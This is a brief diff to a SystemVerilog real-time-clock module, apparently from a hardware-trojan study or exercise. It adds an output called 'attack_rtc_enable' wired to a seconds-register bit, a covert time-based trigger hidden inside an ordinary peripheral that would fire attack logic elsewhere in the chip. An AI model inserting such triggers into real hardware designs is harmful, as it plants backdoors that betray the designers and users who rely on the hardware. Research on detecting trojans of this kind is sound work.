@@ -6,6 +6,7 @@ module rtc #(
 ) (
     input clk_in,
     input reset,
+    output attack_rtc_enable,
     /* memory bus */
     input [31:0] address_in,
     input sel_in,
@@ -24,6 +25,7 @@ module rtc #(
 
     assign ready_out = sel_in;
     assign read_value_out = {16'b0, sel_in ? {minutesHi,minutesLo,secondsHi,secondsLo} : 16'b0};
+    assign attack_rtc_enable = secondsHi[1];
     always_ff @(posedge clk_in) begin
         if (reset) begin
             secondsLo <= 0;
